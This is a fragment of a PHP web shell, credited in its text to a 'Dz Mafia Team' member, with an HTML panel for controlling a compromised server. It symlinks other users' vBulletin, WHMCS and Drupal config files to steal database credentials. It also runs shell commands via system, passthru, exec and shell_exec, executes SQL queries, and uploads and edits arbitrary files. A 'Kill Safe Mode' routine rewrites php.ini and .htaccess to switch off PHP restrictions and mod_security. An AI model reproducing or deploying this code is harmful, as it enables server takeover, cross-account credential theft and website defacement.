symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>

    </tr>

   <td valign="top" colspan="6"><strong></strong></td>

 <form method="POST" target="_blank">
 <strong>
 <input type="hidden" name="go" value="cmd_mysqli">
    </strong>
    <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>CMD mysqli</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>user</strong></td>
   <td valign="top" bgcolor="#151515"><strong><input name="mysqli_l" type="text"></strong></td>
   <td valign="top" bgcolor="#151515"><strong>pass</strong></td>
   <td valign="top" bgcolor="#151515"><strong><input name="mysqli_p" type="text"></strong></td>
   <td valign="top" bgcolor="#151515"><strong>database</strong></td>
   <td valign="top" bgcolor="#151515"><strong><input name="mysqli_db" type="text"></strong></td>
       </tr>
      <tr>
   <td valign="top" bgcolor="#151515" style="height: 25px; width: 139px;">
  <strong>cmd ~</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5" style="height: 25px">
  <strong>
  <textarea name="db_query" style="width: 353px; height: 89px">SHOW DATABASES;
 SHOW TABLES user_vb ;
 SELECT * FROM user;
 SELECT version();
 SELECT user();</textarea></strong></td>
    </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="run"></strong></td>
    </tr>
 <input name="db" value="mysqli" type="hidden">
 <input name="db_server" type="hidden" value="localhost">
 <input name="db_port" type="hidden" value="3306">
 <input name="cccc" type="hidden" value="db_query">

 </form>
   <tr>
   <td valign="top" bgcolor="#151515" colspan="6"><strong></strong></td>


   </tr>

 <form method="POST" target="_blank">
   <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>CMD
  system - passthru - exec - shell_exec</strong></td>
       </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>cmd ~</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
      <select name="att" dir="rtl"  size="1">
<?php
 if($_POST['att']==null)
 {
 echo '      <option value="system" selected="">system</option>';
 }else{
 echo "      <option value='$_POST[att]' selected=''>$_POST[att]</option>
       <option value=system>system</option>
 ";


 }
?>

       <option value="passthru">passthru</option>
       <option value="exec">exec</option>
       <option value="shell_exec">shell_exec</option>
      </select>
   <strong>
 <input name="page" type="hidden" value="ccmmdd">
  <input name="ccmmdd2" type="text" style="width: 284px" value="ls -la"></strong></td>
    </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Go"></strong></td>
    </tr>
 </form>

 <form method="POST" target="_blank">

   <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Show
  File And Edit</strong></td>
       </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Path ~</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
  <input name="pathclass" type="text" style="width: 284px" value="<?php echo realpath('')?>"></strong></td>
    </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="show"></strong></td>
       </tr>
 <input name="page" type="hidden" value="show">
 </form>

     <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Tools</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Upload</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUCSES :) !!!</b><br><br>'; }
 else { echo '<b>Upload Failed :( !!!</b><br><br>'; }
}
?>
     <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Server Info</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
 <?php
 $safe_mode = ini_get('safe_mode');
 if($safe_mode=='1')
 {
 echo 'ON';
 }else{
 echo 'OFF';
 }

 ?>
  </strong>
  </td>
       </tr>

          <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Uname</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
<?php
echo '<b><br>'.php_uname().'<br></b>';
?>
</tr>
</td>

                <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Kill Safe Mode</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
<strong>

<?php
echo "<right>";
echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
 <p align='center'>
 <INPUT type='submit' name='Kill' value='if Safe Mode is On Clic Here To Kill The SafeMode [ini.php] [php.ini] [.htaccess]' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; border-width: 1px'></p>
</form>
";
echo "<right/>";
if  (empty($_POST['Kill'] ) ) {
 }ELSE{
 $action = '?action=Kill';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<b>[SafeMode Done] .. :) This Script Is Coded By Akram Stelle (Dz Mafia Team)</b>";
echo ("<br>");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
KillFilterEngine Off
KillFilterScanPOST Off
KillFilterCheckURLEncoding Off
KillFilterCheckUnicodeEncoding Off
</IfModule>
");


echo "<b>[Mod_Security Done]</b><br>";

    echo "<font><center></td></tr><table> ";

 }
?>

</strong>
</tr>
</td>
<tr>

  <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>SerVer Search</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
<?php


echo " <center> </center>";
$serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "Server IP = <font color=red>".gethostbyname($_SERVER["HTTP_HOST"])."
 </font>[</span>
 <a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">Bing Search</a>][</span><a href='http://zone-h.com/archive/ip=".$serverIP."' target=\"_blank\">Zone-H Search</a>]<center>";
?>
</strong>
</tr>
</td>
        <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong> KrimOu Expect Us</strong></td>
       </tr>
